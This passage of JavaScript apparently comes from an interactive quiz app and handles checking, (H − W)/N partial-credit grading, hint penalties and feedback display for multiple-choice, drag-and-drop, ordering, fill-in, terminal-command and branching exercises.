    try { el.scrollIntoView({ behavior: reduce ? "auto" : "smooth", block: "nearest" }); }
    catch (e) { el.scrollIntoView(); }
  }

  /* ---------- check + grading ---------- */
  function flashCheckMsg(msg) {
    var foot = $id("b-check") && $id("b-check").parentNode;
    if (!foot) return;
    var old = $id("check-flash");
    if (old && old.parentNode) old.parentNode.removeChild(old);
    var f = h("span", "flash", esc(msg));
    f.id = "check-flash";
    foot.appendChild(f);
    setTimeout(function () { if (f.parentNode) f.parentNode.removeChild(f); }, 2200);
  }
  function isEmptyAnswer(ex) {
    var v = S.cur.widget.get();
    if (ex.kind === "qcm" || ex.kind === "multi") return v.length === 0;
    if (ex.kind === "dnd") {
      var keys = Object.keys(v); for (var i = 0; i < keys.length; i++) if (v[keys[i]]) return false; return true;
    }
    if (ex.kind === "order") return false; /* items are always placed */
    if (ex.kind === "fill") { for (var j = 0; j < v.length; j++) if (v[j]) return false; return true; }
    if (ex.kind === "term") return !String(v || "").trim();
    if (ex.kind === "branch") { for (var k = 0; k < v.length; k++) if (v[k]) return false; return true; }
    return false;
  }
  function onCheck() {
    if (!S.cur || S.cur.graded) return;
    /* An empty submission is not an answer: nudge instead of locking the
       exercise at zero. The timer keeps running; no pause is triggered. */
    if (isEmptyAnswer(S.cur.ex)) {
      flashCheckMsg("Choose an answer first, or press Skip to move on.");
      return;
    }
    /* First action, before feedback renders: enter the Check-triggered auto-pause. */
    if (S.tm.state === "RUNNING" || S.tm.state === "IDLE") setTimerState("PAUSED_AUTO_CHECK");
    gradeCurrent();
  }

  function gradeCurrent() {
    var ex = S.cur.ex, ix = ex.ix, w = S.cur.widget;
    var items = [], N = 1, credit = 0, answerHtml = "";
    if (ex.kind === "qcm" || ex.kind === "multi") {
      var sel = w.get(), corr = ix.correct;
      N = corr.length;
      credit = scoreExercise(sel, corr);
      ix.opts.forEach(function (o) {
        var isC = corr.indexOf(o.id) !== -1, isSel = sel.indexOf(o.id) !== -1;
        if (isC) items.push({ h: o.h, st: isSel ? "ok" : "missed" });
        else if (isSel) items.push({ h: o.h, st: "wrong" });
      });
      answerHtml = "<ul class='anslist'>" + ix.opts.filter(function (o) { return corr.indexOf(o.id) !== -1; })
        .map(function (o) { return "<li>" + o.h + "</li>"; }).join("") + "</ul>";
    } else if (ex.kind === "dnd") {
      var pl = w.get();
      var zname = {};
      ix.zones.forEach(function (z) { zname[z.id] = z.h; });
      N = ix.items.length;
      var H1 = 0, W1 = 0;
      ix.items.forEach(function (it) {
        var pz = pl[it.id];
        if (!pz) items.push({ h: it.h + " &rarr; <em>not placed</em>", st: "missed" });
        else if (pz === it.z) { H1++; items.push({ h: it.h + " &rarr; " + zname[it.z], st: "ok" }); }
        else { W1++; items.push({ h: it.h + " &rarr; you placed it in &ldquo;" + zname[pz] + "&rdquo;", st: "wrong" }); }
      });
      credit = Math.max(0, (H1 - W1) / N);
      answerHtml = "<ul class='anslist'>" + ix.items.map(function (it) {
        return "<li>" + it.h + " &rarr; <strong>" + zname[it.z] + "</strong></li>";
      }).join("") + "</ul>";
    } else if (ex.kind === "order") {
      var cur = w.get();
      N = ix.items.length;
      var H2 = 0, W2 = 0;
      var lbl = {};
      ix.items.forEach(function (it) { lbl[it.id] = it.h; });
      cur.forEach(function (id, i) {
        if (id === ix.items[i].id) { H2++; items.push({ h: "Position " + (i + 1) + ": " + ix.items[i].h, st: "ok" }); }
        else { W2++; items.push({ h: "Position " + (i + 1) + ": you placed &ldquo;" + lbl[id] + "&rdquo; &mdash; correct: &ldquo;" + ix.items[i].h + "&rdquo;", st: "wrong" }); }
      });
      credit = Math.max(0, (H2 - W2) / N);
      answerHtml = "<ol class='anslist'>" + ix.items.map(function (it) { return "<li>" + it.h + "</li>"; }).join("") + "</ol>";
    } else if (ex.kind === "fill") {
      var fills = w.get();
      N = ix.slots.length;
      var H3 = 0, W3 = 0;
      ix.slots.forEach(function (a, i) {
        var got = fills[i];
        if (!got) items.push({ h: "Blank " + (i + 1) + " (" + esc(ix.slotNames && ix.slotNames[i] ? ix.slotNames[i] : "blank") + "): left empty &mdash; correct: <strong>" + esc(a) + "</strong>", st: "missed" });
        else if (got.toLowerCase() === a.toLowerCase()) { H3++; items.push({ h: "Blank " + (i + 1) + ": " + esc(got), st: "ok" }); }
        else { W3++; items.push({ h: "Blank " + (i + 1) + ': you wrote &ldquo;' + esc(got) + "&rdquo; &mdash; correct: <strong>" + esc(a) + "</strong>", st: "wrong" }); }
      });
      credit = Math.max(0, (H3 - W3) / N);
      answerHtml = "<p>" + ix.slots.map(function (a, i) { return "Blank " + (i + 1) + ": <strong>" + esc(a) + "</strong>"; }).join(" &middot; ") + "</p>";
    } else if (ex.kind === "term") {
      var n = normCmd(w.get());
      var H4 = 0, W4 = 0;
      ix.elems.forEach(function (e) {
        var ok = e.re.test(n);
        if (ok) H4++;
        items.push({ h: e.h, st: ok ? "ok" : "missed" });
      });
      (ix.forbidden || []).forEach(function (f) {
        if (f.re.test(n)) { W4++; items.push({ h: f.h, st: "wrong" }); }
      });
      N = ix.elems.length;
      credit = Math.max(0, (H4 - W4) / N);
      answerHtml = '<div class="codeblock"><pre class="code">' + esc(ix.canon) + '</pre><button type="button" class="btn mini copybtn">Copy</button></div>' +
        "<ul class='anslist'>" + ix.elems.map(function (e) { return "<li>" + esc(e.h) + "</li>"; }).join("") + "</ul>" +
        (ix.canonNote || "");
    } else if (ex.kind === "branch") {
      var ch = w.get();
      N = ix.steps.length;
      var H5 = 0, W5 = 0;
      function olbl(st, id) { for (var i = 0; i < st.opts.length; i++) if (st.opts[i].id === id) return st.opts[i].h; return "(no answer)"; }
      ix.steps.forEach(function (st, i) {
        var ok = ch[i] === st.correct;
        if (ok) H5++; else W5++;
        items.push({ h: "Step " + (i + 1) + ": " + (ok ? "you chose the best option" : 'you chose &ldquo;' + olbl(st, ch[i]) + "&rdquo; &mdash; best: &ldquo;" + olbl(st, st.correct) + "&rdquo;"), st: ok ? "ok" : "wrong" });
      });
      credit = Math.max(0, (H5 - W5) / N);
      answerHtml = "<ol class='anslist'>" + ix.steps.map(function (st) {
        return "<li>" + st.q + " &rarr; <strong>" + olbl(st, st.correct) + "</strong></li>";
      }).join("") + "</ol>";
    }

    var hintUsed = !!(S.hints[ex.id] && S.hints[ex.id].used);
    var creditFinal = Math.max(0, credit - (hintUsed ? 0.10 : 0));
    if (!(ex.id in S.answered)) S.answeredN++;
    S.score += creditFinal;
    S.answered[ex.id] = { credit: creditFinal, hint: hintUsed };
    delete S.skipped[ex.id];
    S.cur.graded = true;
    S.cur.credit = creditFinal;
    S.cur.items = items;
    S.cur.N = N;
    S.cur.answerHtml = answerHtml;
    S.cur.widget.lock();
    renderScore();
    updateHeader();
    renderFeedback();
  }

  function renderFeedback() {
    var fb = $id("fb");
    if (!fb || !S.cur) return;
    var credit = S.cur.credit, hintUsed = !!(S.hints[S.cur.ex.id] && S.hints[S.cur.ex.id].used);
    var label, cls, icon;
    if (credit >= 0.999) { label = "CORRECT"; cls = "fb-ok"; icon = "&#10003;"; }
    else if (credit > 0) { label = "PARTIALLY CORRECT"; cls = "fb-part"; icon = "&#10003;"; }
    else { label = "INCORRECT"; cls = "fb-no"; icon = "&#10007;"; }
    fb.style.display = "";
    fb.innerHTML = "";
    var head = h("div", "fbhead " + cls);
    head.setAttribute("role", "status");
    head.innerHTML = '<span class="fbicon">' + icon + "</span> " + label +
      (hintUsed ? ' <span class="dim">(hint used: &minus;0.10 credit)</span>' : "");
    fb.appendChild(head);
    var body = h("div", "fbbody");
    if (S.cur.items.length > 1) {
      var Hc = 0; S.cur.items.forEach(function (it) { if (it.st === "ok") Hc++; });
      body.appendChild(h("div", "fbcredit", "credit " + credit.toFixed(2) + " &mdash; " + Hc + "/" + S.cur.N + " items &mdash; scoring: (H &minus; W) / N"));
      S.cur.items.forEach(function (it) {
        var word = it.st === "ok" ? "&#10003; Correct" : it.st === "wrong" ? "&#10007; Wrong" : "&#9675; Missed";
        var cls2 = it.st;
        body.appendChild(h("div", "iline", '<span class="ist ' + cls2 + '">' + word + "</span><span>" + it.h + "</span>"));
      });
    } else if (S.cur.items.length === 1) {
      body.appendChild(h("div", "iline", '<span class="ist ' + (credit >= 0.999 ? "ok" : credit > 0 ? "part" : "wrong") + '">' + (credit >= 0.999 ? "&#10003; Correct" : "&#10007; Incorrect") + "</span><span>" + S.cur.items[0].h + "</span>"));
    }
    body.appendChild(h("h3", null, "Correct answer"));
    body.appendChild(h("div", null, S.cur.answerHtml));
    body.appendChild(h("div", "fbexplain", S.cur.ex.explain));
    body.appendChild(h("div", "fbstudy", "What to study next: " + S.cur.ex.study));
    fb.appendChild(body);
    var nxt = $id("b-next");
    if (nxt) { nxt.disabled = false; }
    var chk = $id("b-check");
    if (chk) chk.disabled = true;
    smoothScroll(fb);
  }

  /* ---------- next / skip / review ---------- */
  function onNext() {
    if (!S.cur || !S.cur.graded) return;
